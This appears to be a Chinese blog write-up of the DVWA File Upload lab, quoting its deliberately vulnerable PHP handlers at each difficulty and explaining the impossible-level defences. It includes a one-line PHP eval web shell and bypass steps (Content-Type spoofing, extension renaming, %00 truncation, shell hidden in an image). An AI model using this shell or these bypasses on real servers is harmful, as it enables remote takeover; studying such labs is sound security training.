---
layout:    post
title:     DVWA之FileUpload
subtitle:  学习学习
date:      2020-12-13
author:    lll-yz
header-img: img/post-bg-coffee.jpg
catalog:    true
tags:

   - DVWA
---

#### File Upload

##### low

```
<?php

if( isset( $_POST[ 'Upload' ] ) ) {
    // Where are we going to be writing to?
    $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );

    // Can we move the file to the upload folder?
    if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) {
        // No
        echo '<pre>Your image was not uploaded.</pre>';
    }
    else {
        // Yes!
        echo "<pre>{$target_path} succesfully uploaded!</pre>";
    }
}

?> 
```

**basename(path,suffix): ** 函数返回路径中的文件名部分，如果可选参数suffix为空，则返回文件名包含后缀名，反之不包含后缀名。

**move_uploaded_file(file,newloc)：** 将上传的文件移动到新位置。file:要移动的文件。newloc:文件的新位置。

没有对上传文件的类型，内容做任何的检测，过滤，可直接进行上传。

采用用一句话木马：

```
<?php @eval($_POST['hack']);?>
```

[![rnP6h9.png](https://s3.ax1x.com/2020/12/14/rnP6h9.png)](https://imgchr.com/i/rnP6h9)

用蚁剑连接看看：

[![rnj1sg.md.png](https://s3.ax1x.com/2020/12/14/rnj1sg.md.png)](https://imgchr.com/i/rnj1sg)

成功：

[![rnj6oR.md.png](https://s3.ax1x.com/2020/12/14/rnj6oR.md.png)](https://imgchr.com/i/rnj6oR)

##### medium

```
<?php

if( isset( $_POST[ 'Upload' ] ) ) {
    // Where are we going to be writing to?
    $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );

    // File information
    $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ];
    $uploaded_type = $_FILES[ 'uploaded' ][ 'type' ];
    $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ];

    // Is it an image?
    if( ( $uploaded_type == "image/jpeg" || $uploaded_type == "image/png" ) &&
        ( $uploaded_size < 100000 ) ) {

        // Can we move the file to the upload folder?
        if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) {
            // No
            echo '<pre>Your image was not uploaded.</pre>';
        }
        else {
            // Yes!
            echo "<pre>{$target_path} succesfully uploaded!</pre>";
        }
    }
    else {
        // Invalid file
        echo '<pre>Your image was not uploaded. We can only accept JPEG or PNG images.</pre>';
    }
}

?> 
```

medium级别代码对上传文件的类型和大小都做了限制，要求文件类型必须是jpeg或png，大小不能超过100000B。

```
( uploaded_type == “image/jpeg” || uploaded_type == “image/png” ) &&
( $uploaded_size < 100000 )
```

1.可以通过burp抓包更改文件content-type:

上传hack.php文件，然后修改content-type为：image/png。

[![rueGge.md.png](https://s3.ax1x.com/2020/12/14/rueGge.md.png)](https://imgchr.com/i/rueGge)

然后上传成功：

[![rueXUx.png](https://s3.ax1x.com/2020/12/14/rueXUx.png)](https://imgchr.com/i/rueXUx)

用蚁剑连接成功。

2.也可更改文件后缀名：

上传文件为123.png，修改文件后缀为123.php。

[![runDXQ.png](https://s3.ax1x.com/2020/12/14/runDXQ.png)](https://imgchr.com/i/runDXQ)

[![ruuUb9.md.png](https://s3.ax1x.com/2020/12/14/ruuUb9.md.png)](https://imgchr.com/i/ruuUb9)

成功。

3.%00截断法：在php版本小于5.3.4的服务器中，当magic_quote_gpc选项为off时，处理字符串的函数认为0x00是终止符，可以在文件名中使用%00截断。

+ 00截断一：更改文件后缀为123.php .jpg，上传时用burp抓包

[![rKQ6OO.md.png](https://s3.ax1x.com/2020/12/15/rKQ6OO.md.png)](https://imgchr.com/i/rKQ6OO)

​		在查看其16进制代码

[![rKQIpt.md.png](https://s3.ax1x.com/2020/12/15/rKQIpt.md.png)](https://imgchr.com/i/rKQIpt)

​		将空格出16进制20 改为 00。

[![rKlQBD.md.png](https://s3.ax1x.com/2020/12/15/rKlQBD.md.png)](https://imgchr.com/i/rKlQBD)

​       查看文件名已改变。

[![rKl0Hg.png](https://s3.ax1x.com/2020/12/15/rKl0Hg.png)](https://imgchr.com/i/rKl0Hg)

​		可以看到上传成功且为php文件。

[![rKljbD.png](https://s3.ax1x.com/2020/12/15/rKljbD.png)](https://imgchr.com/i/rKljbD)

+ 00截断二：将文件名改为123.php%00.jpg，抓包

[![rK3neO.png](https://s3.ax1x.com/2020/12/15/rK3neO.png)](https://imgchr.com/i/rK3neO)

​		然后选中%00，然后进行URL-decode

[![rK3fk4.md.png](https://s3.ax1x.com/2020/12/15/rK3fk4.md.png)](https://imgchr.com/i/rK3fk4)

​		可以看到，文件名改变。(同上)

​		且上传成功，为php文件。(同上)

##### high

```
<?php

if( isset( $_POST[ 'Upload' ] ) ) {
    // Where are we going to be writing to?
    $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );

    // File information
    $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ];
    $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1);
    $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ];
    $uploaded_tmp  = $_FILES[ 'uploaded' ][ 'tmp_name' ];

    // Is it an image?
    if( ( strtolower( $uploaded_ext ) == "jpg" || strtolower( $uploaded_ext ) == "jpeg" || strtolower( $uploaded_ext ) == "png" ) &&
        ( $uploaded_size < 100000 ) &&
        getimagesize( $uploaded_tmp ) ) {

        // Can we move the file to the upload folder?
        if( !move_uploaded_file( $uploaded_tmp, $target_path ) ) {
            // No
            echo '<pre>Your image was not uploaded.</pre>';
        }
        else {
            // Yes!
            echo "<pre>{$target_path} succesfully uploaded!</pre>";
        }
    }
    else {
        // Invalid file
        echo '<pre>Your image was not uploaded. We can only accept JPEG or PNG images.</pre>';
    }
}

?> 
```

**strrpos(string,find,start):**  函数返回字符串find在另一字符串string中最后一次出现的位置，如果没有找到字符串则返回false，可选参数start规定在何处开始搜索。

**$uploaded_ext:**  这里等于文件的后缀名。

**getimagesize(string filename):**  函数会通过读取文件头，返回图片的长、宽等信息，如果没有相关的图片文件头，函数会报错。

high级别代码读取文件名中最后一个"."后的字符串，期望通过文件名来限制文件类型，要求上传的文件名形式必须是以 jpg, jpeg 或 png 之一，且大小<100000B。同时getimagesize函数限制了上传文件的文件头必须为图像类型。

在图片里加入一句话，上传。

[![rKJ1fJ.md.png](https://s3.ax1x.com/2020/12/15/rKJ1fJ.md.png)](https://imgchr.com/i/rKJ1fJ)

成功。

[![rKJy6I.png](https://s3.ax1x.com/2020/12/15/rKJy6I.png)](https://imgchr.com/i/rKJy6I)

##### impossible

```
<?php

if( isset( $_POST[ 'Upload' ] ) ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );


    // File information
    $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ];
    $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1);
    $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ];
    $uploaded_type = $_FILES[ 'uploaded' ][ 'type' ];
    $uploaded_tmp  = $_FILES[ 'uploaded' ][ 'tmp_name' ];

    // Where are we going to be writing to?
    $target_path   = DVWA_WEB_PAGE_TO_ROOT . 'hackable/uploads/';
    //$target_file   = basename( $uploaded_name, '.' . $uploaded_ext ) . '-';
    $target_file   =  md5( uniqid() . $uploaded_name ) . '.' . $uploaded_ext;
    $temp_file     = ( ( ini_get( 'upload_tmp_dir' ) == '' ) ? ( sys_get_temp_dir() ) : ( ini_get( 'upload_tmp_dir' ) ) );
    $temp_file    .= DIRECTORY_SEPARATOR . md5( uniqid() . $uploaded_name ) . '.' . $uploaded_ext;

    // Is it an image?
    if( ( strtolower( $uploaded_ext ) == 'jpg' || strtolower( $uploaded_ext ) == 'jpeg' || strtolower( $uploaded_ext ) == 'png' ) &&
        ( $uploaded_size < 100000 ) &&
        ( $uploaded_type == 'image/jpeg' || $uploaded_type == 'image/png' ) &&
        getimagesize( $uploaded_tmp ) ) {

        // Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD)
        if( $uploaded_type == 'image/jpeg' ) {
            $img = imagecreatefromjpeg( $uploaded_tmp );
            imagejpeg( $img, $temp_file, 100);
        }
        else {
            $img = imagecreatefrompng( $uploaded_tmp );
            imagepng( $img, $temp_file, 9);
        }
        imagedestroy( $img );

        // Can we move the file to the web root from the temp folder?
        if( rename( $temp_file, ( getcwd() . DIRECTORY_SEPARATOR . $target_path . $target_file ) ) ) {
            // Yes!
            echo "<pre><a href='${target_path}${target_file}'>${target_file}</a> succesfully uploaded!</pre>";
        }
        else {
            // No
            echo '<pre>Your image was not uploaded.</pre>';
        }

        // Delete any temp files
        if( file_exists( $temp_file ) )
            unlink( $temp_file );
    }
    else {
        // Invalid file
        echo '<pre>Your image was not uploaded. We can only accept JPEG or PNG images.</pre>';
    }
}

// Generate Anti-CSRF token
generateSessionToken();

?> 
```

**uniqid():**  函数基于以微秒计的当前时间，生成一个唯一的 ID。
**imagecreatefrom(): **系列函数用于从文件或 URL 载入一幅图像，成功返回图像资源，失败则返回一个空字符串。
**magejpeg(image,filename,quality)：**从image图像中以 filename 文件名创建一个jpeg的图片，参数quality可选，0-100 (质量从小到大)
**imagedestroy(image) ：** 销毁图像资源。

impossible级别代码对上传文件进行重命名（md5值，导致%00截断无法绕过过滤规则）。加入Anti-CSRF token防护CSRF攻击。对文件的内容进行严格的检查，让攻击者无法上传含有恶意脚本的文件。

